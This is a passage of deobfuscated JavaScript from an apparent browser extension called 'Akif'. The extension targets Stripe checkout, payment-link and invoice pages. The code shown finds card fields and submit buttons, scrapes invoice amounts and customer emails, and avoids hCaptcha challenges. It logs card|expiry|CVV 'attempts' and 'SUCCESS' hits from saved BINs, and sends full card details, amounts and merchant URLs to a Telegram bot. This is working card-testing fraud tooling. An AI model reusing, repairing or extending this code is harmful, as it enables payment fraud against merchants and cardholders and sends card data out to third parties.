                continue;
              case '1':
                document.documentElement.style.setProperty("background", p_1, "important");
                continue;
              case '2':
                v_16 = p_1;
                continue;
              case '3':
                document.body && (document.body.style.setProperty("background", p_1, "important"), document.body.style.setProperty("background-color", p_1, "important"), document.body.style.setProperty("min-height", "100vh", "important"));
                continue;
              case '4':
                document.documentElement.style.setProperty("min-height", "100vh", "important");
                continue;
            }
            break;
          }
        }
      }
      function fn_13(p_1, p_2) {
        if (v_17.has(p_1)) {
          return;
        }
        p_1.style.setProperty("background", p_2, "important"), p_1.style.setProperty("background-color", p_2, "important"), v_17.add(p_1);
      }
      function fn_14() {
        if (!v_13) {
          return;
        }
        if (!fn_7_1()) {
          return;
        }
        v_2_1 = fn_2_1();
        if (v_2_1) {
          return;
        }
        let v_1_2;
        if (v_14) v_1_2 = v_12;else {
          if (!v_15) {
            v_15 = fn_9_1();
          }
          v_1_2 = v_15;
        }
        v_16 !== v_1_2 && (v_17 = new WeakSet());
        fn_12(v_1_2);
        const v_2_2 = fn_3_1(),
          v_3_2 = v_2_2 ? "[class*=\"LeftPanel\"], [class*=\"left-panel\"], [class*=\"leftPanel\"], [class*=\"Column--left\"], [class*=\"LeftColumn\"], [class*=\"ProductSummary\"], [class*=\"OrderSummary\"], [class*=\"product-summary\"], [class*=\"App\"], [class*=\"Page\"], [class*=\"Root\"], [class*=\"Shell\"], section, main, article, header, aside, nav, .Divider, [class*=\"divider\"], [class*=\"Divider\"], [class*=\"ViewDetails\"], [class*=\"details\"], [class*=\"Details\"], [class*=\"OrderDetails\"], [class*=\"order-details\"], [class*=\"Summary\"], [class*=\"summary\"], [class*=\"PaymentDetails\"], [class*=\"payment-details\"], [class*=\"LineItem\"], [class*=\"line-item\"], [class*=\"OrderSummary\"], [class*=\"order-summary\"], [class*=\"ProductDetails\"], [class*=\"product-details\"]" : "[class*=\"App\"], [class*=\"app\"], [class*=\"Page\"], [class*=\"page\"], [class*=\"Container\"], [class*=\"container\"], [class*=\"Wrapper\"], [class*=\"wrapper\"], [class*=\"Layout\"], [class*=\"layout\"], [class*=\"Content\"], [class*=\"content\"], [class*=\"Main\"], [class*=\"Body\"], [class*=\"body\"], [class*=\"Root\"], [class*=\"root\"], [class*=\"Shell\"], [class*=\"shell\"], [class*=\"Frame\"], [class*=\"frame\"], [class*=\"View\"], [class*=\"view\"], [class*=\"Panel\"], [class*=\"panel\"], [class*=\"Section\"], [class*=\"section\"], [class*=\"Block\"], [class*=\"block\"], [class*=\"Region\"], [class*=\"region\"], [class*=\"Area\"], [class*=\"area\"], [class*=\"Zone\"], [class*=\"zone\"], [class*=\"Checkout\"], [class*=\"checkout\"], [class*=\"Payment\"], [class*=\"Stripe\"], [class*=\"stripe\"], section, main, article, header, aside, nav, .Divider, [class*=\"divider\"], [class*=\"Divider\"], [class*=\"ViewDetails\"], [class*=\"details\"], [class*=\"Details\"], [class*=\"OrderDetails\"], [class*=\"order-details\"], [class*=\"Summary\"], [class*=\"summary\"], [class*=\"PaymentDetails\"], [class*=\"payment-details\"], [class*=\"LineItem\"], [class*=\"line-item\"], [class*=\"OrderSummary\"], [class*=\"order-summary\"], [class*=\"ProductDetails\"], [class*=\"product-details\"]";
        document.querySelectorAll(v_3_2).forEach(p_1 => {
          if (!fn_1_2(p_1) && !fn_8_1(p_1) && (!v_2_2 || !fn_11(p_1))) {
            fn_13(p_1, v_1_2);
          }
        });
        if (v_2_2) {
          const v_1_3 = document.getElementsByTagName("div");
          for (let v_1_4 = 0, v_2_3 = v_1_3.length; v_1_4 < v_2_3; v_1_4++) {
            const v_1_5 = v_1_3[v_1_4];
            if (v_17.has(v_1_5)) continue;
            if (fn_1_2(v_1_5) || fn_8_1(v_1_5) || fn_11(v_1_5)) continue;
            const v_2_4 = v_1_5.className || '';
            typeof v_2_4 === "string" && (v_2_4.includes("Left") || v_2_4.includes("left") || v_2_4.includes("Product") || v_2_4.includes("product") || v_2_4.includes("Order") || v_2_4.includes("order") || v_2_4.includes("Summary") || v_2_4.includes("summary")) && fn_13(v_1_5, v_1_2);
          }
        } else {
          const v_1_3 = document.getElementsByTagName("div");
          for (let v_1_4 = 0, v_2_3 = v_1_3.length; v_1_4 < v_2_3; v_1_4++) {
            const v_1_5 = v_1_3[v_1_4];
            if (v_17.has(v_1_5)) {
              continue;
            }
            if (fn_1_2(v_1_5) || fn_8_1(v_1_5)) continue;
            fn_13(v_1_5, v_1_2);
          }
          if (v_18) {
            cancelAnimationFrame(v_18);
          }
          v_18 = requestAnimationFrame(() => {
            const v_1_4 = ["span", 'p', 'li', 'ul', 'ol', 'dl', "table", 'tr', 'td', 'th', "form", "fieldset", "figure", "figcaption", "footer"];
            for (let v_1_5 = 0; v_1_5 < v_1_4.length; v_1_5++) {
              const v_1_6 = document.getElementsByTagName(v_1_4[v_1_5]);
              for (let v_1_7 = 0, v_2_3 = v_1_6.length; v_1_7 < v_2_3; v_1_7++) {
                const v_1_8 = v_1_6[v_1_7];
                if (v_17.has(v_1_8)) {
                  continue;
                }
                if (fn_1_2(v_1_8) || fn_8_1(v_1_8)) continue;
                fn_13(v_1_8, v_1_2);
              }
            }
            v_18 = null;
          });
        }
      }
      let v_19 = false;
      setInterval(() => {
        if (!v_1_1) return;
        const v_1_2 = fn_2_1();
        if (v_1_2 !== v_19) {
          v_19 = v_1_2, v_2_1 = v_1_2;
          if (v_1_2 && typeof fn_73 === "function") fn_73();else !v_1_2 && typeof fn_74 === "function" && fn_74();
        }
        if (!v_13) {
          return;
        }
        if (v_2_1) return;
        const v_2_2 = window.getComputedStyle(document.body).backgroundColor,
          v_3_2 = window.getComputedStyle(document.documentElement).backgroundColor;
        (v_2_2 === "rgba(0, 0, 0, 0)" || v_2_2 === "transparent" || v_3_2 === "rgba(0, 0, 0, 0)" || v_3_2 === "transparent" || v_2_2.includes("255, 255, 255") || v_3_2.includes("255, 255, 255")) && fn_14();
      }, 300);
      let v_20 = null,
        v_21 = false;
      function fn_15() {
        if (!v_1_1) return;
        if (!v_13) {
          return;
        }
        if (v_21) {
          return;
        }
        if (v_2_1) {
          return;
        }
        v_20 && clearTimeout(v_20), v_20 = setTimeout(() => {
          const v_1_2 = "2|1|3|0|4".split('|');
          let v_2_2 = 0;
          while (true) {
            switch (v_1_2[v_2_2++]) {
              case '0':
                fn_14();
                continue;
              case '1':
                if (fn_2_1()) {
                  v_2_1 = true;
                  return;
                }
                continue;
              case '2':
                if (!v_1_1) return;
                continue;
              case '3':
                v_21 = true;
                continue;
              case '4':
                v_21 = false;
                continue;
            }
            break;
          }
        }, 50);
      }
      const v_22 = new MutationObserver(p_1 => {
          const v_1_2 = p_1.some(p_1_1 => Array.from(p_1_1.addedNodes).some(p_1_2 => p_1_2.nodeType === 1 && p_1_2.matches && (p_1_2.matches("[class*=\"hcaptcha\"]") || p_1_2.matches("[id*=\"hcaptcha\"]") || p_1_2.matches("[data-hcaptcha]") || p_1_2.matches("iframe[src*=\"hcaptcha\"]") || p_1_2.matches("iframe[src*=\"captcha\"]") || p_1_2.matches("[class*=\"captcha\"]") || p_1_2.matches("[class*=\"challenge\"]") || p_1_2.matches("[class*=\"Challenge\"]"))));
          if (v_1_2) {
            v_2_1 = true;
            typeof fn_73 === "function" && fn_73();
            return;
          }
          const v_2_2 = p_1.some(p_1_1 => Array.from(p_1_1.removedNodes).some(p_1_2 => p_1_2.nodeType === 1 && p_1_2.matches && (p_1_2.matches("[class*=\"hcaptcha\"]") || p_1_2.matches("[id*=\"hcaptcha\"]") || p_1_2.matches("[data-hcaptcha]") || p_1_2.matches("iframe[src*=\"hcaptcha\"]") || p_1_2.matches("iframe[src*=\"captcha\"]") || p_1_2.matches("[class*=\"captcha\"]") || p_1_2.matches("[class*=\"challenge\"]") || p_1_2.matches("[class*=\"Challenge\"]") || p_1_2.matches("[role=\"dialog\"]"))));
          if (v_2_2) {
            setTimeout(() => {
              v_2_1 = fn_2_1();
              !v_2_1 && (v_3_1 = true, fn_14(), typeof fn_74 === "function" && fn_74(), setTimeout(() => {
                v_3_1 = false;
              }, 400));
            }, 500);
            return;
          }
          const v_3_2 = p_1.some(p_1_1 => p_1_1.type === "childList" && p_1_1.addedNodes.length > 0);
          v_3_2 && !v_2_1 && fn_15();
        }),
        v_23 = {};
      v_23.childList = true, v_23.subtree = true;
      const v_24 = v_23;
      if (document.body) {
        const v_1_2 = {};
        v_1_2.childList = true, v_1_2.subtree = true, v_22.observe(document.body, v_1_2);
      } else document.addEventListener("DOMContentLoaded", () => v_22.observe(document.body, v_24));
      const v_25 = ["#cardNumber", "[name=\"cardNumber\"]", "[name=\"card-number\"]", "[name=\"cardnumber\"]", "[autocomplete=\"cc-number\"]", "[data-elements-stable-field-name=\"cardNumber\"]", "input[placeholder*=\"card number\" i]", "input[placeholder*=\"card no\" i]", "input[aria-label*=\"card number\" i]", "#card-number", ".card-number", "[name=\"number\"]", "[name=\"ccnumber\"]", "[name=\"cc-number\"]", "[data-stripe=\"number\"]", "input[name*=\"cardNumber\" i]", "input[name*=\"card_number\" i]", "input[name*=\"creditcard\" i]", "input[id*=\"cardNumber\" i]", "input[id*=\"card-number\" i]", "input[id*=\"cc-number\" i]"],
        v_26 = [".SubmitButton", "[class*=\"SubmitButton\"]", ".SubmitButton-IconContainer", ".Button--primary", "button[type=\"submit\"]", "[data-testid=\"hosted-payment-submit-button\"]", ".pay-button", ".payment-button", "button[class*=\"pay\" i]", "button[class*=\"submit\" i]"];
      function fn_16() {
        for (const v_1_3 of v_25) {
          try {
            if (document.querySelector(v_1_3)) return true;
          } catch (v_1_4) {}
        }
        const v_1_2 = document.querySelectorAll("iframe");
        for (const v_1_3 of v_1_2) {
          try {
            const v_1_4 = v_1_3.src || '';
            if (v_1_4.includes("stripe") || v_1_3.name.includes("card") || v_1_3.id.includes("card")) return true;
          } catch (v_1_4) {}
        }
        return false;
      }
      function fn_17() {
        for (const v_1_2 of v_26) {
          try {
            if (document.querySelector(v_1_2)) {
              return true;
            }
          } catch (v_1_3) {}
        }
        return false;
      }
      function fn_18() {
        const v_1_2 = window.location.href,
          v_2_2 = window.location.hostname.toLowerCase(),
          v_3_2 = window.location.pathname.toLowerCase(),
          v_4_2 = v_2_2.includes("stripe.com") || v_2_2.includes("checkout.") || v_2_2.includes("pay.") || v_2_2.includes("billing.") || v_2_2.includes("invoice.") || v_2_2.includes("buy.");
        if (!v_4_2) return false;
        if (v_1_2.includes("cs_live_") || v_1_2.includes("cs_test_")) return true;
        if (v_3_2.includes("/checkout/session/")) return true;
        if (v_3_2.includes("/checkout") && v_4_2) return true;
        if (v_1_2.includes("checkout.stripe.com/c/pay")) {
          return true;
        }
        if (v_2_2 === "buy.stripe.com") {
          return true;
        }
        return false;
      }
      function fn_19() {
        return !!fn_70(window.location.href) && !!fn_71();
      }
      function fn_20() {
        return window.location.href.includes("invoice.stripe.com") || window.location.href.includes("/invoice/");
      }
      function fn_21() {
        return window.location.hostname.toLowerCase() === "buy.stripe.com" || window.location.hostname.endsWith(".buy.stripe.com");
      }
      let v_27 = null;
      function fn_22() {
        if (v_27) return v_27;
        try {
          const v_1_2 = document.querySelectorAll("script");
          for (const v_1_3 of v_1_2) {
            const v_1_4 = v_1_3.textContent || '';
            if (v_1_4.includes("\"object\":\"invoice\"") || v_1_4.includes("\"amount_due\"")) {
              const v_1_5 = v_1_4.match(/\{[\s\S]*"object"\s*:\s*"invoice"[\s\S]*\}/);
              if (v_1_5) try {
                const v_1_6 = JSON.parse(v_1_5[0]);
                if (v_1_6.object === "invoice") {
                  const v_1_7 = {
                    'amount': v_1_6.amount_due || v_1_6.total || 0,
                    'currency': v_1_6.currency || "usd",
                    'email': v_1_6.customer_email || '',
                    'productName': v_1_6.lines?.["data"]?.[0]?.["hosted_invoice_product_name"] || '',
                    'businessUrl': v_1_6.business_url || '',
                    'voided': v_1_6.voided === true
                  };
                  return v_27 = v_1_7, v_27;
                }
              } catch (v_1_6) {}
            }
          }
          if (window.__STRIPE_INVOICE__) {
            const v_1_3 = window.__STRIPE_INVOICE__,
              v_2_3 = {
                'amount': v_1_3.amount_due || v_1_3.total || 0,
                'currency': v_1_3.currency || "usd",
                'email': v_1_3.customer_email || '',
                'productName': v_1_3.lines?.["data"]?.[0]?.["hosted_invoice_product_name"] || '',
                'businessUrl': v_1_3.business_url || '',
                'voided': v_1_3.voided === true
              };
            return v_27 = v_2_3, v_27;
          }
          const v_2_2 = document.body?.["innerText"] || '',
            v_3_2 = v_2_2.match(/[\w.-]+@[\w.-]+\.\w+/),
            v_4_2 = v_2_2.match(/[₩$€£¥]\s*[\d,]+\.?\d*/);
          if (v_3_2 || v_4_2) {
            const v_1_3 = {};
            v_1_3.amount = v_4_2 ? v_4_2[0] : '0', v_1_3.currency = '', v_1_3.email = v_3_2 ? v_3_2[0] : '', v_1_3.productName = '', v_1_3.businessUrl = '', v_1_3.voided = false, v_27 = v_1_3;
          }
        } catch (v_1_2) {}
        return v_27;
      }
      function fn_23() {
        return fn_22()?.["voided"] === true;
      }
      function fn_24(p_1, p_2 = 40) {
        let v_1_2 = 0;
        const fn_1_3 = () => {
          if (fn_21()) {
            if (fn_16() && fn_17()) {
              p_1(true);
              return;
            }
            if (document.querySelector("[class*=\"PaymentElement\"], [class*=\"StripeElement\"], [class*=\"CardElement\"], [class*=\"CheckoutPaymentForm\"]")) {
              p_1(true);
              return;
            }
            if (document.querySelector("[class*=\"App\"], [id=\"root\"], [class*=\"Checkout\"]") && v_1_2 >= 5) {
              p_1(true);
              return;
            }
          }
          if (fn_20()) {
            fn_22();
            if (fn_23()) {
              p_1(false);
              return;
            }
            if (fn_16() && fn_17() || window.location.hostname === "invoice.stripe.com") {
              p_1(true);
              return;
            }
          }
          if (fn_16() && fn_17() && fn_18() && fn_19()) p_1(true);else v_1_2 < p_2 ? (v_1_2++, setTimeout(fn_1_3, v_1_2 < 5 ? 200 : 150)) : p_1(false);
        };
        fn_1_3();
      }
      const v_28 = new Map();
      let v_29 = 0;
      function fn_25(p_1) {
        return new Promise(p_1_1 => {
          const v_1_2 = ++v_29;
          v_28.set(v_1_2, p_1_1);
          const v_2_2 = {
            'type': "AKIF_TO_BACKGROUND",
            'requestId': v_1_2,
            'payload': p_1
          };
          window.postMessage(v_2_2, '*');
          setTimeout(() => {
            if (v_28.has(v_1_2)) {
              v_28.delete(v_1_2), p_1_1({
                'success': false,
                'error': "Request timeout"
              });
            }
          }, 60000);
        });
      }
      window.addEventListener("message", p_1 => {
        if (p_1.data && p_1.data.type === "AKIF_FROM_BACKGROUND" && p_1.data.requestId) {
          const v_1_2 = v_28.get(p_1.data.requestId);
          v_1_2 && (v_28.delete(p_1.data.requestId), v_1_2(p_1.data.response || {
            'success': false,
            'error': "No response"
          }));
        }
      });
      let v_30 = false,
        v_31 = false,
        v_32 = false,
        v_33 = false,
        v_34 = 0,
        v_35 = Math.floor(Math.random() * 500) + 500,
        v_36 = [],
        v_37 = "bin",
        v_38 = [],
        v_39 = 0,
        v_40 = '',
        v_41 = '',
        v_42 = '',
        v_43 = localStorage.getItem("akif_tg_forward_enabled") === "true",
        v_44 = localStorage.getItem("akif_tg_bot_token") || '',
        v_45 = localStorage.getItem("akif_tg_user_id") || '',
        v_46 = false,
        v_47 = 1,
        v_48 = '',
        v_49 = '',
        v_50 = false,
        v_51 = [],
        v_52 = 0,
        v_53 = null,
        v_54 = null;
      const v_55 = {};
      v_55.cardNumber = '', v_55.bin = '', v_55.amount = '0', v_55.currency = '', v_55.email = '', v_55.businessUrl = '', v_55.successUrl = '';
      let v_56 = v_55,
        v_57 = false,
        v_58 = false,
        v_59 = false,
        v_60 = false,
        v_61 = new Set(),
        v_62 = 0,
        v_63 = false,
        v_64 = '',
        v_65 = false,
        v_66 = null;
      const v_67 = {};
      v_67.cardNumber = '', v_67.cardExpiry = '', v_67.cardCvc = '';
      let v_68 = v_67;
      function fn_26() {
        return new Promise(p_1 => {
          if (window.AkifStorage && window.AkifStorage.loadAllData) {
            window.AkifStorage.loadAllData(function (p_1_1) {
              p_1_1 = p_1_1 || {};
              let v_1_3 = p_1_1[v_7.LOGS] || [];
              if (typeof v_1_3 === "string") try {
                v_1_3 = JSON.parse(v_1_3);
              } catch (v_1_4) {
                v_1_3 = [];
              }
              let v_2_3 = p_1_1[v_7.LOGS_CLEARED_AT] || null;
              if (v_2_3) {
                const v_1_4 = new Date(v_2_3).getTime();
                v_1_3 = v_1_3.filter(function (p_1_2) {
                  return new Date(p_1_2.time || p_1_2.timestamp).getTime() > v_1_4;
                });
              }
              Array.isArray(v_1_3) && (v_36 = v_1_3, localStorage.setItem(v_7.LOGS, JSON.stringify(v_1_3))), v_2_3 && localStorage.setItem(v_7.LOGS_CLEARED_AT, v_2_3), p_1();
            }), setTimeout(p_1, 3000);
            return;
          }
          let v_1_2 = false,
            v_2_2 = false;
          let v_3_2 = [],
            v_4_2 = null;
          const fn_1_3 = p_1_1 => {
            if (p_1_1.data && p_1_1.data.type === "USAGI_STORAGE_RESPONSE") {
              if (p_1_1.data.key === v_7.LOGS) {
                v_3_2 = p_1_1.data.value || [];
                if (typeof v_3_2 === "string") {
                  try {
                    v_3_2 = JSON.parse(v_3_2);
                  } catch (v_1_3) {
                    v_3_2 = [];
                  }
                }
                v_1_2 = true;
              }
              p_1_1.data.key === v_7.LOGS_CLEARED_AT && (v_4_2 = p_1_1.data.value, v_2_2 = true);
              if (v_1_2 && v_2_2) {
                window.removeEventListener("message", fn_1_3), v_36 = v_4_2 ? v_3_2.filter(p_1_2 => p_1_2.time && p_1_2.time > v_4_2) : v_3_2, p_1(v_36);
              }
            }
          };
          window.addEventListener("message", fn_1_3);
          setTimeout(() => {
            if (!v_1_2) {
              window.removeEventListener("message", fn_1_3);
              const v_1_3 = JSON.parse(localStorage.getItem(v_7.LOGS) || '[]'),
                v_2_3 = localStorage.getItem(v_7.LOGS_CLEARED_AT);
              v_36 = v_2_3 ? v_1_3.filter(p_1_1 => p_1_1.time && p_1_1.time > v_2_3) : v_1_3, p_1(v_36);
            }
          }, 1000);
        });
      }
      function fn_27() {
        const v_1_2 = v_36.slice(0, 50),
          v_2_2 = {
            [v_7.LOGS]: v_1_2
          },
          v_3_2 = v_2_2;
        window.postMessage({
          'type': "AKIF_STORAGE_RESPONSE",
          'requestId': "logs_" + Date.now(),
          'action': "SET",
          'data': v_3_2
        }, '*');
        localStorage.setItem(v_7.LOGS, JSON.stringify(v_1_2));
      }
      fn_26().then(() => {
        typeof fn_37 === "function" && fn_37();
      });
      async function fn_28(p_1) {
        try {
          const v_1_2 = p_1.attempt;
          if (v_1_2 === undefined || v_1_2 === null || v_1_2 === "N/A" || v_1_2 === 0 || v_1_2 === '0') return;
          if (!v_44 || v_44.length < 10) return;
          if (!v_45 || v_45.length < 5) {
            return;
          }
          const v_2_2 = p_1.cardNumber || "N/A",
            v_3_2 = v_2_2.includes('|') ? v_2_2.split('|') : [v_2_2, '??', '??', "???"],
            v_4_2 = v_3_2[0] || "N/A",
            v_5_2 = v_3_2[1] || '??',
            v_6_2 = v_3_2[2] || '??',
            v_7_2 = v_3_2[3] || "???",
            v_8_2 = {};
          v_8_2.usd = '$', v_8_2.eur = '€', v_8_2.gbp = '£', v_8_2.try = '₺';
          const v_9_2 = v_8_2,
            v_10_2 = (p_1.currency || "usd").toLowerCase(),
            v_11_2 = v_9_2[v_10_2] || v_10_2.toUpperCase() + '\x20',
            v_12_1 = p_1.amount || '0',
            v_13_1 = '' + v_11_2 + v_12_1,
            v_14_1 = String(v_1_2),
            v_15_1 = p_1.businessUrl || "N/A",
            v_16_1 = p_1.successUrl || v_15_1 || "N/A",
            v_17_1 = p_1.timeTaken || "N/A";
          if (v_43 && v_45) {
            const v_1_3 = "Card: <code>" + v_4_2 + '|' + v_5_2 + '|' + v_6_2 + '|' + v_7_2 + "</code>\nEmail: <code>" + (p_1.email || v_49 || "N/A") + "</code>\nAttempt: <code>" + v_14_1 + "</code>\nAmount: <code>" + v_13_1 + "</code>\nBusiness URL: <code>" + v_15_1 + "</code>\nTime: <code>" + v_17_1 + "</code>\n<a href=\"" + v_16_1 + "\">Open Success URL</a>\nThanks For Using Akif Free. \u2764\uFE0F";
            try {
              const v_1_4 = {
                'type': "TELEGRAM_SEND",
                'botToken': v_44,
                'chatId': v_45,
                'text': v_1_3,
                'disablePreview': true
              };
              fn_25(v_1_4);
            } catch (v_1_4) {}
          }
        } catch (v_1_2) {}
      }
      function fn_29() {
        return new Promise(p_1 => {
          if (!window.AkifStorage || !window.AkifStorage.loadAllData) {
            v_50 = true, p_1();
            return;
          }
          window.AkifStorage.loadAllData(function (p_1_1) {
            p_1_1 = p_1_1 || {};
            if (p_1_1[v_7.SAVED_BINS]) {
              let v_1_2 = p_1_1[v_7.SAVED_BINS];
              if (typeof v_1_2 === "string") try {
                v_1_2 = JSON.parse(v_1_2);
              } catch (v_1_3) {
                v_1_2 = [];
              }
              Array.isArray(v_1_2) && v_1_2.length > 0 && (v_51 = [...new Set(v_1_2)]);
            }
            p_1_1[v_7.BG_COLOR] && (v_12 = p_1_1[v_7.BG_COLOR]);
            p_1_1[v_7.CUSTOM_NAME] && (v_48 = p_1_1[v_7.CUSTOM_NAME], localStorage.setItem(v_7.CUSTOM_NAME, v_48));
            p_1_1[v_7.CUSTOM_EMAIL] && (v_49 = p_1_1[v_7.CUSTOM_EMAIL], localStorage.setItem(v_7.CUSTOM_EMAIL, v_49));
            p_1_1[v_7.TOKEN] && localStorage.setItem(v_7.TOKEN, p_1_1[v_7.TOKEN]);
            p_1_1[v_7.USER_ID] && (v_40 = p_1_1[v_7.USER_ID], localStorage.setItem(v_7.USER_ID, p_1_1[v_7.USER_ID]));
            p_1_1[v_7.FIRST_NAME] && (v_41 = p_1_1[v_7.FIRST_NAME]);
            p_1_1[v_7.SAVED_ID] && (v_42 = p_1_1[v_7.SAVED_ID]);
            v_50 = true;
            p_1();
          }), setTimeout(() => {
            !v_50 && (v_50 = true, p_1());
          }, 3000);
        });
      }
      function fn_30(p_1, p_2) {
        const v_1_2 = {};
        v_1_2[p_1] = p_2;
        const v_2_2 = v_1_2;
        window.postMessage({
          'type': "AKIF_STORAGE_RESPONSE",
          'requestId': "save_" + Date.now(),
          'action': "SET",
          'data': v_2_2
        }, '*'), localStorage.setItem(p_1, typeof p_2 === "object" ? JSON.stringify(p_2) : p_2);
      }
      fn_29();
      function fn_31() {
        return new Promise(p_1 => {
          v_48 = localStorage.getItem(v_7.CUSTOM_NAME) || '', v_49 = localStorage.getItem(v_7.CUSTOM_EMAIL) || '';
          const v_1_2 = {};
          v_1_2.name = v_48, v_1_2.email = v_49;
          const v_2_2 = v_1_2;
          p_1(v_2_2);
        });
      }
      function fn_32(p_1) {
        v_48 = p_1;
        localStorage.setItem(v_7.CUSTOM_NAME, p_1);
        window.AkifStorage && window.AkifStorage.saveCustomName && window.AkifStorage.saveCustomName(p_1);
      }
      function fn_33(p_1) {
        v_49 = p_1, localStorage.setItem(v_7.CUSTOM_EMAIL, p_1), window.AkifStorage && window.AkifStorage.saveCustomEmail && window.AkifStorage.saveCustomEmail(p_1);
      }
      fn_31();
      function fn_34() {
        return v_51[v_52] || v_51[0] || '';
      }
      let v_69 = '',
        v_70 = 0;
      const v_71 = 1500;
      function fn_35(p_1, p_2 = "info") {
        const v_1_2 = Date.now();
        if (p_1 === v_69 && v_1_2 - v_70 < v_71) return;
        v_69 = p_1, v_70 = v_1_2;
        if (p_2 === "info" && (p_1.includes('✅') || p_1.includes("success") || p_1.includes("Saved"))) p_2 = "success";else p_2 === "info" && (p_1.includes('❌') || p_1.includes("error") || p_1.includes("Decline") || p_1.includes("failed")) && (p_2 = "error");
        const v_2_2 = p_1.replace(/^[✅❌⚠️ℹ️🎉]\s*/, '').trim(),
          v_3_2 = {};
        v_3_2.success = '✓', v_3_2.error = '!', v_3_2.info = 'i';
        const v_4_2 = v_3_2;
        let v_5_2 = document.querySelector(".akif-toast-stack");
        !v_5_2 && (v_5_2 = document.createElement("div"), v_5_2.className = "akif-toast-stack", document.body.appendChild(v_5_2));
        const v_6_2 = document.createElement("div");
        v_6_2.className = "akif-toast " + p_2, v_6_2.innerHTML = "<div class=\"akif-toast-ic\">" + v_4_2[p_2] + "</div><div class=\"akif-toast-body\">" + v_2_2 + "</div><div class=\"akif-toast-progress\" style=\"animation-duration:3s\"></div>";
        v_5_2.appendChild(v_6_2);
        while (v_5_2.children.length > 5) v_5_2.removeChild(v_5_2.firstChild);
        requestAnimationFrame(() => requestAnimationFrame(() => v_6_2.classList.add("show"))), setTimeout(() => {
          v_6_2.parentNode && (v_6_2.classList.remove("show"), v_6_2.classList.add("hide"), setTimeout(() => v_6_2.remove(), 400));
        }, 3000);
      }
      let v_72 = null;
      function fn_36(p_1, p_2, p_3, p_4) {
        const v_1_2 = p_1 + '|' + p_2 + '|' + p_3 + '|' + p_4;
        v_34++;
        v_72 && v_72.parentNode && v_72.remove();
        const v_2_2 = document.createElement("div");
        v_2_2.className = "card-toast", v_2_2.style.cssText = "\n    position: fixed !important;\n    top: 95px !important;\n    right: 16px !important;\n    z-index: 2147483648 !important;\n  ";
        v_2_2.innerHTML = "\n    <div class=\"card-toast-icon\">\n      <svg width=\"18\" height=\"18\" viewBox=\"0 0 24 24\" fill=\"none\" xmlns=\"http://www.w3.org/2000/svg\">\n        <rect x=\"2\" y=\"5\" width=\"20\" height=\"14\" rx=\"2\" stroke=\"currentColor\" stroke-width=\"1.5\" fill=\"none\"/>\n        <path d=\"M2 10H22\" stroke=\"currentColor\" stroke-width=\"1.5\"/>\n        <circle cx=\"7\" cy=\"15\" r=\"1.5\" fill=\"currentColor\"/>\n        <circle cx=\"12\" cy=\"15\" r=\"1.5\" fill=\"currentColor\"/>\n      </svg>\n    </div>\n    <div class=\"card-toast-content\">\n      <div class=\"card-toast-label\">ATTEMPT " + v_34 + "</div>\n      <div class=\"card-toast-value\">" + v_1_2 + "</div>\n    </div>\n    <button class=\"card-toast-copy\" title=\"Copy\"><i class=\"fas fa-copy\"></i></button>\n  ";
        if (!document.querySelector("#akif-fa-cdn")) {
          const v_1_3 = document.createElement("link");
          v_1_3.id = "akif-fa-cdn", v_1_3.rel = "stylesheet", v_1_3.href = "https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.2/css/all.min.css", v_1_3.crossOrigin = "anonymous", v_1_3.referrerPolicy = "no-referrer", document.head.appendChild(v_1_3);
        }
        if (!document.querySelector("#akif-toast-style")) {
          const v_1_3 = document.createElement("style");
          v_1_3.id = "akif-toast-style", v_1_3.textContent = v_3, document.head.appendChild(v_1_3);
        }
        document.body.appendChild(v_2_2), v_72 = v_2_2;
        const v_3_2 = v_2_2.querySelector(".card-toast-copy");
        v_3_2.addEventListener("click", p_1_1 => {
          p_1_1.stopPropagation(), navigator.clipboard.writeText(v_1_2).then(() => {
            v_3_2.innerHTML = "<i class=\"fas fa-check\"></i>", setTimeout(() => v_3_2.innerHTML = "<i class=\"fas fa-copy\"></i>", 1500);
          });
        });
        setTimeout(() => {
          v_2_2 && v_2_2.parentNode && (v_2_2.classList.add("hide"), setTimeout(() => {
            v_2_2.parentNode && v_2_2.remove();
            v_72 === v_2_2 && (v_72 = null);
          }, 300));
        }, 3500);
      }
      function fn_37() {
        const v_1_2 = document.getElementById("historyList");
        if (!v_1_2) return;
        if (v_36.length === 0) {
          v_1_2.innerHTML = "<div class=\"history-empty\">No logs yet</div>";
          return;
        }
        const v_2_2 = v_36.slice(0, 50);
        v_1_2.innerHTML = v_2_2.map((p_1, p_2) => "<div class=\"history-item " + (p_1.response === "SUCCESS" ? "success" : "error") + "\"><div class=\"history-main\"><div class=\"history-card-line\"><span class=\"history-card\">" + p_1.card + "</span><button class=\"history-copy\" data-card=\"" + p_1.card + "\" data-index=\"" + p_2 + "\"><i class=\"fas fa-copy\"></i></button></div><div class=\"history-response\">" + p_1.response + "</div></div></div>").join(''), v_1_2.querySelectorAll(".history-copy").forEach(p_1 => {
          p_1.addEventListener("click", function () {
            const v_1_3 = this.getAttribute("data-card");
            v_1_3 && navigator.clipboard.writeText(v_1_3).then(() => {
              this.innerHTML = "<i class=\"fas fa-check\"></i>";
              setTimeout(() => {
                this.innerHTML = "<i class=\"fas fa-copy\"></i>";
              }, 1000);
            }).catch(() => {
              const v_1_4 = {
                'type': "COPY_TO_CLIPBOARD_TEXT",
                'text': v_1_3
              };
              window.postMessage(v_1_4, '*'), this.innerHTML = "<i class=\"fas fa-check\"></i>", setTimeout(() => {
                this.innerHTML = "<i class=\"fas fa-copy\"></i>";
              }, 1000);
            });
          });
        });
      }
      function fn_38(p_1, p_2, p_3, p_4, p_5) {
        const v_1_2 = {
          'card': p_1 + '|' + p_2 + '|' + p_3 + '|' + p_4,
          'response': p_5,
          'time': new Date().toLocaleTimeString(),
          'timestamp': Date.now()
        };
        v_36.unshift(v_1_2);
        v_36.length > 50 && v_36.pop();
        fn_27(), fn_37(), fn_39();
        try {
          if (p_5 === "SUCCESS") {
            const v_1_4 = {};
            v_1_4.detail = v_1_2, window.dispatchEvent(new CustomEvent("akif:hit", v_1_4));
          }
          const v_1_3 = {};
          v_1_3.detail = v_1_2, window.dispatchEvent(new CustomEvent("akif:history", v_1_3));
        } catch (v_1_3) {}
      }
      function fn_39(p_1, p_2) {
        const v_1_2 = document.getElementById("statAttempts"),
          v_2_2 = document.getElementById("statSuccess");
        if (v_1_2) {
          v_1_2.textContent = p_1 !== undefined ? p_1 : v_34;
        }
        v_2_2 && (v_2_2.textContent = p_2 !== undefined ? p_2 : v_36.filter(p_1_1 => p_1_1.response === "SUCCESS").length);
      }
      function fn_40(p_1) {
        function fn_1_3(p_1_1) {
          let v_1_2 = 0;
